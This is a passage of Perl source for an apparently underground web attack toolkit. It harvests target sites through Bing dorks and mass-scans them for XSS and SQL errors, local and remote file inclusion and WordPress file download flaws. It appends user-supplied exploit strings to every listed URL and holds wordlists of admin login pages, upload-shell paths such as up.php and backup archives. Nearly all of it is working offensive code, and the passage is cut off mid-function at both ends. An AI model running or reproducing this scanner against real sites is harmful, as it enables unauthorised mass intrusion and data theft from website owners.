sub ADMIN {@ADMIN=("/admin/", "/myadmin/", "/acceso/", "/administrator/", "/admin1/", "/admin2/", "/admin3/", "/admin4/", "/admin5/", "/usuarios/", "/usuario/", "/administrador/", "/administrateur/", "/moderator/", "/webadmin/", "/adminarea/", "/bb-admin/", "/adminLogin/", "/admin_area/", "/panel-administracion/", "/instadmin/", "/memberadmin/", "/administratorlogin/", "/adm/", "/wp-login.php", "/admin/account.php", "/admin/index.php", "/admin/login.php", "/admin/admin.php", "/admin/account.php", "/admin_area/admin.php", "/admin_area/login.php", "/siteadmin/login.php", "/siteadmin/index.php", "/siteadmin/login.html", "/admin/account.html", "/admin/index.html", "/admin/login.html", "/admin/admin.html", "/admin_area/index.php", "/bb-admin/index.php", "/bb-admin/login.php", "/bb-admin/admin.php", "/admin/home.php", "/admin_area/login.html", "/admin_area/index.html", "/admin/controlpanel.php", "/admin.php", "/admincp/index.asp", "/admincp/login.asp", "/admincp/index.html", "/admin/account.html", "/administracion", "/adminpanel.html", "/webadmin.html", "/webadmin/index.html", "/webadmin/admin.html", "/webadmin/login.html", "/admin/admin_login.html", "/admin_login.html", "/panel-administracion/login.html", "/admin/cp.php", "/cp.php", "/administrator/index.php", "/administrator/login.php", "/nsw/admin/login.php", "/webadmin/login.php", "/admin/admin_login.php", "/admin_login.php", "/administrator/account.php", "/administrator.php", "/admin_area/admin.html", "/pages/admin/admin-login.php", "/admin/admin-login.php", "/admin-login.php", "/bb-admin/index.html", "/bb-admin/login.html", "/acceso.php", "/bb-admin/admin.html", "/admin/home.html", "/login.php", "/modelsearch/login.php", "/moderator.php", "/moderator/login.php", "/moderator/admin.php", "/account.php", "/pages/admin/admin-login.html", "/admin/admin-login.html", "/admin-login.html", "/controlpanel.php", "/admincontrol.php", "/admin/adminLogin.html", "/adminLogin.html", "/admin/adminLogin.html", "/home.html", "/rcjakar/admin/login.php", "/adminarea/index.html", "/adminarea/admin.html", "/webadmin.php", "/webadmin/index.php", "/webadmin/admin.php", "/admin/controlpanel.html", "/admin.html", "/admin/cp.html", "cp.html", "/adminpanel.php", "/moderator.html", "/administrator/index.html", "/administrator/login.html", "/user.html", "/administrator/account.html", "/administrator.html", "/login.html", "/modelsearch/login.html", "/moderator/login.html", "/adminarea/login.html", "/panel-administracion/index.html", "/panel-administracion/admin.html", "/modelsearch/index.html", "/modelsearch/admin.html", "/admincontrol/login.html", "/adm/index.html", "adm.html", "/moderator/admin.html", "/user.php", "account.html", "/controlpanel.html", "/admincontrol.html", "/panel-administracion/login.php", "/wp-login.php", "/adminLogin.php", "/admin/adminLogin.php", "/home.php", "/admin.php", "/adminarea/index.php", "/adminarea/admin.php", "/adminarea/login.php", "/panel-administracion/index.php", "/panel-administracion/admin.php", "/modelsearch/index.php", "/modelsearch/admin.php", "/admincontrol/login.php", "/adm/admloginuser.php", "/admloginuser.php", "/admin2.php", "/admin2/login.php", "/admin2/index.php", "/usuarios/login.php", "/adm/index.php", "/adm.php", "/affiliate.php", "/adm_auth.php", "/memberadmin.php", "/administratorlogin.php");
}

sub SUBDOMAIN {@SUBDOMAIN =("about.", "abose.", "acme.", "ad.", "admanager.", "admin.", "admins.", "administrador.", "administrateur.", "administrator.", "ads.", "adsense.", "adult.", "adwords.", "affiliate.", "affiliatepage.", "afp.", "analytics.", "android.", "shop.", "echop.", "blog.", "tienda.", "answer.", "ap.", "api.", "apis.", "app.", "bank.", "blogs.", "client.", "clients.", "community.", "content.", "cpanel.", "dashbord.", "data.", "developer.", "developers.", "dl.", "docs.", "documents.", "download.", "downloads.", "encrypted.", "email.", "webmail.", "mail.", "correo.", "ftp.", "forum.", "forums.", "feed.", "feeds.", "file.", "files.", "gov.", "home.", "help.", "invoice.", "invoises.", "items.", "js.", "es.", "it.", "en.", "fr.", "ar.", "legal.", "iphone.", "lab.", "labs.", "list.", "lists.", "log.", "logs.", "errors.", "net.", "mysql.", "mysqldomain.", "net.", "network.", "news.", "ns.", "ns1.", "ns2.", "ns3.", "ns4.", "ns5.", "org.", "panel.", "partner.", "partners.", "pop.", "pop3.", "private.", "proxies.", "public.", "reports.", "root.", "rss.", "prod.", "prods.", "sandbox.", "search.", "server.", "servers.", "signin.", "signup.", "login.", "smtp.", "srntp.", "ssl.", "soap.", "stat.", "statics.", "store.", "status.", "survey.", "sync.", "system.", "text.", "test.", "webadmin.", "webdisk.", "xhtml.", "xhtrnl.", "xml.");
}

sub UPLOAD {@UPLOAD = ("/up.php", "/up1.php", "up/up.php", "/site/up.php", "/vb/up.php", "/forum/up.php", "/blog/up.php", "/upload.php", "/upload1.php", "/upload2.php", "/vb/upload.php", "/forum/upload.php", "blog/upload.php", "site/upload.php", "download.php");
}

sub ZIP {@ZIP = ("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip", "/vb/backup.zip", "/site/backup.zip", "/backup.zip", "/backup.rar", "/backup.sql", "/vb/vb.zip", "/vb.zip", "/vb.sql", "/vb.rar", "/vb1.zip", "/vb2.zip", "/vbb.zip", "/vb3.zip", "/upload.zip", "/up/upload.zip", "/joomla.zip", "/joomla.rar", "/joomla.sql", "/wordpress.zip", "/wp/wordpress.zip", "/blog/wordpress.zip", "/wordpress.rar");
}
##########

#######################################################
#######################################################
sub dorklist {
  $listcheck1 = "dorks.txt";
  if (-e $listcheck1){ unlink 'dorks.txt'};
  
  if (defined $dork) {
    if (($dork =~ m/.txt/i) || ($dork =~ m/.log/i)) {
	  use File::Copy qw(copy);
	  copy $dork, 'dorks.txt';
    }else{
	  if ($dork =~ m/,/i) {
        $dork =~ s/,/ /g;
  	  }elsif ($dork =~ m/ /i) {
        $dork =~ s/ /+/g;
	  }
      my @dorks = split / /, $dork;  
      foreach my $dork (@dorks) {
        open (FILE, '>>dorks.txt');
        print FILE "$dork\n";
        close (FILE);
      }
	}  
  }	
}


sub mlistname {
  $listname = $listname;
}
sub mexploit {
  $exploit = $exploit;
}
sub mvalidation_text {
  $validation_text = $validation_text;
}
sub Target {
  $Target = $Target;
  if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
}

sub server {
  $listcheck3 = "servers.txt";
  if (-e $listcheck3){ unlink 'servers.txt'};
  if (defined $Target) {
    if (($Target =~ m/.txt/i) || ($Target =~ m/.log/i)) {
	  use File::Copy qw(copy);
	  copy $Target, 'servers.txt';
	}else{
      $Target =~ s/,/ /g;
      my @servers = split / /, $Target;  
      foreach my $Target (@servers) {
        open (FILE, '>>servers.txt');
        print FILE "$Target\n";
        close (FILE);
      }
	}
  }
  if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
    if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
      print color 'red';
      print "    [!] The given IP is not valid!\n";
      print color RESET;
	  exit();
    }
  }
}
sub forwait {
  print color 'yellow';
  print "    [+] Please wait...";
  print color RESET;
  print" \n";
  sleep(1);
 }
sub listchekxss {
  $listcheck = "XSS_Site_Scan.txt";
  if (-e $listcheck){ unlink 'XSS_Site_Scan.txt'};
 }
sub listchekvalidation {
  $listcheck = "Validated_Scan.txt";
  if (-e $listcheck){ unlink 'Validated_Scan.txt'};
 }
sub listchekisup{
  $listcheck = "Validated_Scan.txt";
  if (-e $listcheck){ unlink 'Validated_Scan.txt'};
 }
sub listchekjoomrfi {
  $listcheck = "Joom_RFI_Scan.txt";
  if (-e $listcheck){ unlink 'Joom_RFI_Scan.txt'};
 }
sub listcheklfi {
   $listcheck = "LFI_Scan.txt";
  if (-e $listcheck){ unlink 'LFI_Scan.txt'};
 }
sub listchekadmin {
  $listcheck = "Admin_page.txt";
  if (-e $listcheck){ unlink 'Admin_page.txt'};
 }
sub listchekwplfi {
  $listcheck = "WP_ADF_Scan.txt";
  if (-e $listcheck){ unlink 'WP_ADF_Scan.txt'};
 }
sub listcheksubdomain {
  if (-e $listcheck){ unlink 'Subdomains_Scan.txt'};
}
sub negative {	
  print color 'red';
  print "    [!] No Results Found!\n";
  print color RESET;
  print color 'red';
  print "    [!] SCAN FINISHED!\n";
  print color RESET;
}
sub finxss {  
  $list = "XSS_Site_Scan.txt";
  if (-e $list){  
    print" \n";
    my $lc = 0;
    my $file = "XSS_Site_Scan.txt";
    open my $file, "<", "XSS_Site_Scan.txt";
    $lc++ while <$file>;
    print color 'green';
    print "    [!] $lc Unique Result(s) Found!\n";
    print color RESET;
    close $file;
    print color 'yellow';
    print "    [+] Results saved in $Bin XSS_Site_Scan.txt! \n";
    print color RESET;
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
  }else{
    negative();
  }	
}
		
sub finisup {  
  $list = "Validated_Scan.txt";
  if (-e $list){  
    print" \n";
    my $lc = 0;
    my $file = "Validated_Scan.txt";
    open my $file, "<", "Validated_Scan.txt";
    $lc++ while <$file>;
    print color 'green';
    print "    [!] $lc Unique Result(s) Found!\n";
    print color RESET;
    close $file;
    print color 'yellow';
    print "    [+] Results saved in $Bin Validated_Scan.txt! \n";
    print color RESET;
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
  }else{
    negative();
  }	
}
sub finvalidation {  
  $list = "Validated_Scan.txt";

if (-e $list){  
    print" \n";
    my $lc = 0;
    my $file = "Validated_Scan.txt";
    open my $file, "<", "Validated_Scan.txt";
    $lc++ while <$file>;
    print color 'green';
    print "    [!] $lc Unique Result(s) Found!\n";
    print color RESET;
    close $file;
    print color 'yellow';
    print "    [+] Results saved in $Bin Validated_Scan.txt! \n";
    print color RESET;
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
  }else{
    negative();
  }	
}
		
sub finlfi {
  $list = "LFI_Scan.txt";
  if (-e $list){  ### 
    print" \n";
    my $lc = 0;
    my $file = "LFI_Scan.txt";
    open my $file, "<", "LFI_Scan.txt";
    $lc++ while <$file>;
    print color 'green';
    print "    [!] $lc Unique Result(s) Found!\n";
    print color RESET;
    close $file;
    print color 'yellow';
    print "    [+] Results saved in $Bin LFI_Scan.txt! \n";
    print color RESET;
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
  }else{
    negative();
  }	
}
	
sub finjomrfi {
  $list = "Joom_RFI_Scan.txt";
  if (-e $list){  ### 
    print" \n";
    my $lc = 0;
    my $file = "Joom_RFI_Scan.txt";
    open my $file, "<", "Joom_RFI_Scan.txt";
    $lc++ while <$file>;
    print color 'green';
    print "    [!] $lc Unique Result(s) Found!\n";
    print color RESET;
    close $file;
    print color 'yellow';
    print "    [+] Results saved in $Bin Joom_RFI_Scan.txt! \n";
    print color RESET;
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
  }else{
    negative();
  }	
}
		
sub finwpadf {
  $list = "WP_ADF_Scan.txt";
  if (-e $list){  ### 
    print" \n";
    my $lc = 0;
    my $file = "WP_ADF_Scan.txt";
    open my $file, "<", "WP_ADF_Scan.txt";
    $lc++ while <$file>;
    print color 'green';
    print "    [!] $lc Unique Result(s) Found!\n";
    print color RESET;
    close $file;
    print color 'yellow';
    print "    [+] Results saved in $Bin WP_ADF_Scan.txt! \n";
    print color RESET;
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
  }else{
    negative();
  }	
}
		
sub finadmin {
  $list = "Admin_page.txt";
  if (-e $list){  ### 
    print" \n";
    my $lc = 0;
    my $file = "Admin_page.txt";
    open my $file, "<", "Admin_page.txt";
    $lc++ while <$file>;
    print color 'green';
    print "    [!] $lc Unique Result(s) Found!\n";
    print color RESET;
    close $file;
    print color 'yellow';
    print "    [+] Results saved in $Bin Admin_page.txt! \n";
    print color RESET;
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
  }else{
    negative();
  }	
}
		
sub finadomain {
  $list = "Subdomains_Scan.txt";
  if (-e $list){  ### 
    print" \n";
    my $lc = 0;
    my $file = "Subdomains_Scan.txt";
    open my $file, "<", "Subdomains_Scan.txt";
    $lc++ while <$file>;
    print color 'green';
    print "    [!] $lc Unique Result(s) Found!\n";
    print color RESET;
    close $file;
    print color 'yellow';
    print "    [+] Results saved in $Bin Subdomains_Scan.txt! \n";
    print color RESET;
    print color 'red';
    print "    [!] SCAN FINISHED!\n";
    print color RESET;
  }else{
    negative();
  }	
}
		
sub targetorlist {
  if ($code =~ /200/) {
    print color 'green';
    print "    [+] $site2\n";
    print color RESET;

    open (TEXT, '>>Validated_Scan.txt');
    print TEXT "$site2\n";
    close (TEXT);
  }
}
		
sub mlisup {
  listchekisup();
  mlistname();
  mexploit();
  countargets();
  forwait();
  open (TEXT, $listname);
  while (my $Target = <TEXT>) { 
    chomp $Target;
    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
    print "    [+] Checking $Target\n";
    my $URL = $Target.$exploit;
    $URL =~ s/ //g;
    $useragent = LWP::UserAgent->new;
    $resp = $useragent->head($URL);
    if (head($URL)) {
      print color 'green';
      print "    [+] $URL\n";
      print color RESET;

	  open (INFO, '>>Validated_Scan.txt');
      print INFO "$URL\n";
	  close (INFO);
    }	
  }
  finisup();
}
		
sub mtisup {
  listchekisup();
  Target();
  mexploit();
  forwait();
  my $URL = $Target.$exploit;
  $URL =~ s/ //g;
  $useragent = LWP::UserAgent->new;
  $resp = $useragent->head($URL);
  if (head($URL)) {
    print color 'green';
    print "    [+] $URL\n";
    print color RESET;

    open (INFO, '>>Validated_Scan.txt');
    print INFO "$URL\n";
    close (INFO);
  }	
  finisup();
}
		
sub mlvalidation {
  listchekvalidation();
  mlistname();
  mexploit();
  countargets();
  forwait();
  open (TEXT, $listname);
  while (my $Target = <TEXT>) { 
    chomp $Target;
    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
    print "    [+] Checking $Target\n";
    my $URL = $Target.$exploit;
    $URL =~ s/ //g;
			
    $request = HTTP::Request->new('GET', $URL);
    $response = $ua->request($request);
    my $html = $response->content;
    if($html =~ m/$validation_text/i){
      print color 'green';
      print "    [+] $URL\n";
      print color RESET;

	  open (INFO, '>>Validated_Scan.txt');
      print INFO "$URL\n";
	  close (INFO);
    }	
  }
  finvalidation();
}
		
sub mtvalidation {
  listchekisup();
  Target();
  mexploit();
  forwait();
  my $URL = $Target.$exploit;
  $URL =~ s/ //g;
  $request = HTTP::Request->new('GET', $URL);
  $response = $ua->request($request);
  my $html = $response->content;
  if($html =~ m/$validation_text/i){
    print color 'green';
    print "    [+] $URL\n";
    print color RESET;

    open (INFO, '>>Validated_Scan.txt');
    print INFO "$URL\n";
    close (INFO);
  }	
  finvalidation();
} 

sub countargets {
  my $lc = 0;
  my $file = $listname;
  open my $file, "<", $listname;
  $lc++ while <$file>;
  print color 'yellow';
  print "   [!] $lc Result(s) Found in the List!\n";
  print color RESET;
  close $file;
}

##########################################
##########################################

sleep (1);
TASKS:;
print color 'bold magenta';
print "[..][+] PRINCIPAL MENU\n";
print color 'magenta', RESET;
print "    ::::::::::::::::::::::::::::::::::::::";
print "\n    [+] 1 = SEARCH ENGINE (BING)";
print "\n    [+] 2 = SITE SCANNER";
print "\n    [+] 3 = SERVER SCANNER";
print "\n    [+] 4 = MD5 / BASE 64";
print "\n    [+] 5 = TERMINAL";
print "\n    [+] 6 = ABOUT";
print "\n    [+] 7 = HELP";
print "\n    [+] 8 = EXIT (->)";
print "\n    ::::::::::::::::::::::::::::::::::::::";

task:;
print color 'yellow';
print "\n    [+] Please select a task: ";
print color RESET;
$task=<STDIN>;
chomp($task);
if (!$task){
  print color 'red';
  print "    [+] Uppss.. Invalid option!\n";
  print color RESET;
  goto task;
  };

#DORK SEARCH

if($task eq "1"){

  sleep (1);
  dork:;
  print color 'yellow';
  print "    [+] Please enter your Dork: ";
  print color RESET;
  $dork=<STDIN>;
  chomp ($dork); 
   
  if (!$dork){
    print color 'red';
	print "    [+] Uppss.. you have to set a value!\n";
    print color RESET;
	goto dork;
  };
  dorklist();
  nresult:;
  print color 'yellow';
  print "    [+] Number of page results to print: ";
  print color RESET;
  chomp ($nresult=<STDIN>);
  if (!$nresult){ 
    print color 'red';
	print "    [+] Uppss.. you have to set a value!\n";
    print color RESET;
	goto nresult;
  };
    
##############################################################
sub submsearch {
  dorklist();
  $nresult = $mpages;
  msearch();
}
##############################################################
##############################################################
## bgn sub msearch
   sub msearch {
##############################################################
    print color 'yellow';
    print "    [+] Searching, please wait...\n\n";
    print color RESET;
    sleep(1);
    $listcheck = "Search_Scan.txt";
    if (-e $listcheck){ unlink 'Search_Scan.txt'};
	
    open (FILE, "dorks.txt");
    while (my $dork = <FILE>) {
      print "\n";
      print color 'bold';
      print "    [+] checking $dork \n";
      print color RESET;
	  
      $s_results = $dork;
      my @scanlist=&scan($s_results);
      sub scan(){
        my @search;
        for($npages=1;$npages<=$nresult;$npages+=1){
          my $google=("http://www.bing.com/search?q=".$s_results."&first=".$npages);
          my $search=$ua->get("$google");
          $search->as_string;
          my $Res=$search->content;
          while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)/g){
            if($1 !~ /msn|live|microsoft|WindowsLiveTranslator|youtube|google|cache|74.125.153.132|inurl:|q=|404|403|Time|out|Network|Failed/){
              my $site=$1;
              $site=~s/&(.*)/\ /g;
			  if ((defined $exploit) && ((defined $misup) || (defined $validation_text))) {
	            if($site =~ /([^:]*:\/\/)?([^\/]*\.)*([^\/\.]+\.[^\/]+)/g) {
		          $site=$3;
			    }
			  }
	          print color 'green';
              print "    [+] http://$site\n";
	          print color RESET;

              open (TEXT, '>>Search_Scan.txt');
              print TEXT "http://$site\n";
              close (TEXT);
			  
			  my $file = 'Search_Scan.txt';
              my %seen = ();
              {
                local @ARGV = ($file);
                local $^I = '.bac';
                while(<>){
                  $seen{$_}++;
                  next if $seen{$_} > 1;
                  print;
                  close (TEXT);
				  unlink "Search_Scan.txt.bac";
				  unlink "dorks.txt";
                }
              }
            }
          }
        }
      }   
    }

    $list = "Search_Scan.txt";
    if (-e $list){
	
      print" \n";
      my $lc = 0;
	  my $file = "Search_Scan.txt";
      open my $file, "<", "Search_Scan.txt";
      $lc++ while <$file>;
	  print color 'green';
	  print "    [!] $lc Unique Result(s) Found!\n";
	  print color RESET;
	  close $file;

      print color 'yellow';
      print "    [!] Results saved in $Bin Search_Scan.txt\n";
      print color RESET;
    }else{
      print color 'yellow';
      print "    [+] No Results Found!\n";
      print color RESET;
    }
	
	if ((defined $mxss) || (defined $mlfi) || (defined $mcommand) || (defined $misup) || (defined $validation_text)) {
	  print "\n    [+]::::::::::::::::::::::::::::::::::::::\n";
	  print color 'bold';
	  print "    [!] ::: SUBPROCESS ... \n";
	  print color RESET;
	  print "    [+]::::::::::::::::::::::::::::::::::::::\n\n ";
	  sleep(1);

	  if (defined $mlfi) { mlistLfi(); exit(); }
      elsif ((defined $misup) && (defined $exploit)) { mlisup(); exit(); }
      elsif ((defined $validation_text) && (defined $exploit)) { mlvalidation(); exit(); }
	  
	  
      ##elsif ((defined $exploit) && (defined $misup)) { mlisup(); exit(); }
      ##elsif ((defined $exploit) && (defined $validation_text)) { mvalidation(); exit(); }
	  
    }else{
      print color 'red';
      print "    [!] SCAN FINISHED!\n";
	  print color RESET;
    }

##############################################################
  } ## end sub msearch
  msearch ();
##############################################################

################################################################

  print color 'yellow';
  print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
  print color RESET;
  $after6=<STDIN>;
  chomp ($after6);
  if ($after6==1) {
    print color 'red';
    print "    [!] The Program will restart in 4s to reset scan buffing...\n";
    print color RESET;
    sleep(4);
    exec( $^X, $0, @ARGV);
  }
  if ($after6==0) {
    print color 'red';
    print "    [!] Have A Good Time! Bye.\n";
    print color RESET;
    exit;
  }
}

#######################################################################
#######################################################################
#SITE SCANNER
if($task eq "2"){

  sleep (1);
  ID:;
  print color 'bold magenta';
  print "[..][+] SCAN SITES OPTIONS\n";
  print color 'magenta', RESET;
  print "    ::::::::::::::::::::::::::::::::::::::\n";
  print "    [+] 1 = CHECK HTTPD VERSION\n";
  print "    [+] 2 = XSS SCAN\n";
  print "    [+] 3 = LFI SCAN\n";
  print "    [+] 4 = RFI SCAN (JOOMLA)\n";
  print "    [+] 5 = ADF SCAN (WORDPRESS)\n";
  print "    [+] 6 = FIND ADMIN PAGE\n";
  print "    [+] 7 = FIND SUBDOMAINS\n";
  print "    [+] 8 = BACK (<-)\n";
  print "    [+] 9 = EXIT (->)\n";
  print "    ::::::::::::::::::::::::::::::::::::::\n";
  print color 'yellow';
  print "    [+] Select an option -> ";
  print color RESET;
  $ID =<STDIN>;
  chomp($ID);

##########
#CHECK HTTPD VERSION
  if ($ID==1){
    sleep (1);
    id1:;
    print color 'yellow';
    print "    [+] Please Enter Target [http://www.site.com] ";
    print "\n    [+] Target: ";
    print color RESET;
    $Target=<STDIN>;
    chomp ($Target);
  
    if (!$Target){ 
      print color 'red';
      print "    [+] Uppss.. you have to set a Target!\n";

      print color RESET;
      goto id1;
    };
  
    sub mhttpd {
      Target();
      print" \n";
      $useragent = LWP::UserAgent->new;
      $resp = $useragent->head($Target);
	  if (head($Target)) {
        print color 'green';
        print "    [!] ".$resp->headers_as_string;
        print color RESET;
      }else{
        print color 'red';
        print "\n    [!] Not a valid target!\n";
        print color RESET;
      }
      print color 'red';
      print "    [!] SCAN FINISHED!\n";
      print color RESET;
	}
	mhttpd();
    after1:;
    print color 'yellow';
    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
	print color RESET;
    $after1=<STDIN>;
    chomp ($after1);
    if ($after1==1) {
      goto ID;
    }
    if ($after1==0) {
      print color 'red';
      print "    [!] Have A Good Time! Bye.\n";
	  print color RESET;
      exit;
    }
    if ($after1 != 1 or 0 ) {
	  print color 'red';
      print "    [!] Upsss.. Invalid Option!\n";
	  print color RESET;
      sleep(1);
      goto after1;
    }
  }

  ########
  ##########
  #XSS SCAN
  if ($ID==2){
    sleep (1);
    ###########################
    ####### BGN CHECK USE LIST
    ###########################
    USELIST:;
    print color 'yellow';
    print "    [+] Do You Want To Scan a List? (Y/n): ";
    print color RESET;
    $uselist=<STDIN>;
    chomp ($uselist);
    ####### END CHECK USE LIST
	####### BGN LIST NAME
	if ($uselist =~ /^[Y]?$/i) {
	  LISTNAME:;
      print color 'yellow';
      print "    [+] Enter List Name [Ex:list.txt]: ";
      print color RESET;
      $listname=<STDIN>;
      chomp ($listname);
	  if (!$listname){ 
        print color 'red';
	    print "    [+] Uppss.. you have to Enter List Name!\n";
        print color RESET;
	    goto LISTNAME;
      };
	  
      $listcheck = $listname;
      if (!-e $listcheck){
	    print color 'red';
		use File::Basename;
	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
	    print color RESET;
		goto LISTNAME;
	  }

      #####
	  USEXPLOIT:;
      print color 'yellow';
      print "    [+] Do You Want To Use an Exploit? (Y/n): ";
      print color RESET;
      $usexploit=<STDIN>;
      chomp ($usexploit);
	  
	  if ($usexploit =~ /^[Y]?$/i) {
	    id221:;
        print color 'yellow';
        print "    [+] Enter Exploit: ";
        print color RESET;
        $exploit=<STDIN>;
        chomp ($exploit);
	    if (!$exploit){ 
          print color 'red';
	      print "    [+] Uppss.. you have to Enter your Exploit!\n";
          print color RESET;
	      goto id221;
        };
	  
        VALIDATE:;
        print color 'yellow';
        print "    [+] Do You Want To Validate Results? (Y/n): ";
        print color RESET;
        $validate=<STDIN>;
	    if ($validate =~ /^[Y]?$/i) {
	      id2221:;
          print color 'yellow';
          print "    [+] Enter Text to Validate: ";
          print color RESET;
          $validation_text=<STDIN>;
          chomp ($validation_text);
		  if (!$validation_text){ 
            print color 'red';
	        print "    [+] Uppss.. you have to Enter your Text to Validate!\n";
            print color RESET;
	        goto id2221;
          };
          ###################################################################
          ## bgn mLexplVaXss
          sub mLexplVaXss {
	        listchekxss();
	        mlistname();
		    mexploit();
		    mvalidation_text();
            ###################################################################		
            countargets();
		    forwait();
            open (TEXT, $listname);
	        while (my $Target = <TEXT>) { 
	          chomp $Target;
	          if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
              print "    [+] Checking $Target\n";
	          my $URL = $Target.$exploit;
			  $URL =~ s/ //g;			  
              $request = HTTP::Request->new('GET', $URL);
              $response = $ua->request($request);
              my $html = $response->content;
	          if($html =~ m/$validation_text/i){
	            print color 'green';
                print "    [+] $URL\n";
	            print color RESET;
				
		        open (INFO, '>>XSS_Site_Scan.txt');
                print INFO "$URL\n";
		        close (INFO);
			  }	         
		    }
		    finxss();
            ###################################################################
            ## end mLexplVaXss
          }
        ###################################################################		
        mLexplVaXss();
	  }else{ ### THEN NO VALIDATION
        ###################################################################
        ## bgn mLexplXss
        sub mLexplXss {
	      listchekxss();
	      XSS();
	      mlistname();
		  mexploit();
          ###################################################################		
          countargets();
          forwait();
          open (TEXT, $listname);
	      while (my $Target = <TEXT>) { 
	        chomp $Target;
	        if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
            print "    [+] Checking $Target\n";
	        my $URL = $Target.$exploit;
		    $URL =~ s/ //g;
            $request = HTTP::Request->new('GET', $URL);
            $response = $ua->request($request);
            my $html = $response->content;
	        if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
	          print color 'green';
              print "    [+] $URL\n";
	          print color RESET;

		      open (INFO, '>>XSS_Site_Scan.txt');
              print INFO "$URL\n";
		      close (INFO);
	        }	
		  }
		  finxss();
        ###################################################################
        ## end mLexplXss
        }
      ###################################################################		
      mLexplXss();
	  }  ### END NO VALIDATION
    }else{ ### THEN NO EXPLOIT
      ############################
      ## bgn mLXss
      sub mLXss  {
	    listchekxss();
	    XSS();
	    mlistname();
        ####################
        countargets();
        forwait();
        open (TEXT, $listname);
	    while (my $Target = <TEXT>) {
	      chomp $Target;
	      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
          print "    [+] Checking $Target\n";

	      foreach $XSS(@XSS){
            my $URL = $Target.$XSS;
            $request = HTTP::Request->new('GET', $URL);
            $response = $ua->request($request);
            my $html = $response->content;
	        if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
	          print color 'green';
              print "    [+] $URL\n";
	          print color RESET;
				
		      open (INFO, '>>XSS_Site_Scan.txt');
              print INFO "$URL\n";
		      close (INFO);
	        } 
          }
	    }
		  finxss();
        ###########################
        ## end mLXss
        }
        ###########################
        mLXss();
      } ### END NO EXPLOIT
    }else{ ####### IF NO USE LIST
	  USEXPLOIT:;
      print color 'yellow';
      print "    [+] Do You Want To Use an Exploit? (Y/n): ";
      print color RESET;
      $usexploit=<STDIN>;
      chomp ($usexploit);
	  
	    if ($usexploit =~ /^[Y]?$/i) {
	    id221:;
        print color 'yellow';
        print "    [+] Enter Exploit: ";
        print color RESET;
        $exploit=<STDIN>;
        chomp ($exploit);
	    if (!$exploit){ 
          print color 'red';
	      print "    [+] Uppss.. you have to Enter your Exploit!\n";
          print color RESET;
	      goto id221;
        };

        id21:;
        print color 'yellow';
        print "\n    [+] Please Enter Target [http://www.site.com] ";
        print "\n    [+] Target: ";
        print color RESET;
        $Target=<STDIN>;
        chomp ($Target);
        if (!$Target){ 
          print color 'red';
	      print "    [+] Uppss.. you have to set a Target!\n";
          print color RESET;
	      goto id21;
        };
        if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
	  
        VALIDATE:;
        print color 'yellow';
        print "    [+] Do You Want To Validate Results? (Y/n): ";
        print color RESET;
        $validate=<STDIN>;
		
	    if ($validate =~ /^[Y]?$/i) {
	      id2221:;
          print color 'yellow';
          print "    [+] Enter Text to Validate: ";
          print color RESET;
          $validation_text=<STDIN>;
          chomp ($validation_text);
   		  if (!$validation_text){ 
            print color 'red';
	        print "    [+] Uppss.. you have to Enter your Text to Validate!\n";
            print color RESET;
	        goto id2221;
          };
		
          ################################
          ## bgn mtexplVaXss
          sub mtexplVaXss {
	        listchekxss();
	        Target();
	        mexploit();
		    mvalidation_text();
            ##############################
            forwait();
	        my $URL = $Target.$exploit;
			$URL =~ s/ //g;
            $request = HTTP::Request->new('GET', $URL);
            $response = $ua->request($request);
            my $html = $response->content;
	        if($html =~ m/$validation_text/i){
	          print color 'green';
              print "    [+] $URL\n";
	          print color RESET;
			
		      open (INFO, '>>XSS_Site_Scan.txt');
              print INFO "$URL\n";
		      close (INFO);
			}
		    finxss();
            ###################################
            ## end mtexplVaXss
          }
          ####################################
          mtexplVaXss();  
	    }else{ ### THEN NO VALIDATION
          ####################################
          ## bgn mexplXss
          sub mtexplXss {
	        listchekxss();
		    XSS();
	        Target();
	        mexploit();
            ###########################
            forwait();
	        my $URL = $Target.$exploit;
			$URL =~ s/ //g;
            $request = HTTP::Request->new('GET', $URL);
            $response = $ua->request($request);
            my $html = $response->content;
	        if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
	          print color 'green';
              print "    [+] $URL\n";
	          print color RESET;
			
		      open (INFO, '>>XSS_Site_Scan.txt');
              print INFO "$URL\n";
		      close (INFO);
			}
		    finxss();
            #############################
            ## end mexplXss
          }
          ################################

          mexplXss(); 
           
 	    }  ### END VALIDATION
      }else{ ### THEN NO EXPLOIT
        id2:;
        print color 'yellow';
        print "    [+] Please Enter Target [http://www.site.com/search.php?id=12] \n";
        print "    [+] Target: ";
        print color RESET;
        $Target=<STDIN>;
        chomp ($Target);
        if (!$Target){ 
          print color 'red';
	      print "    [+] Uppss.. you have to set a Target!\n";
          print color RESET;
	      goto id2;
        };
  
        if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
	
        ###########################################

        ## bgn mtXss
        sub mtXss{
	      listchekxss();
		  XSS();
	      Target();
          #########################################
          forwait();
          foreach $XSS(@XSS){
            my $URL = $Target.$XSS;
            $request = HTTP::Request->new('GET', $URL);
            $response = $ua->request($request);
            my $html = $response->content;
	        if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
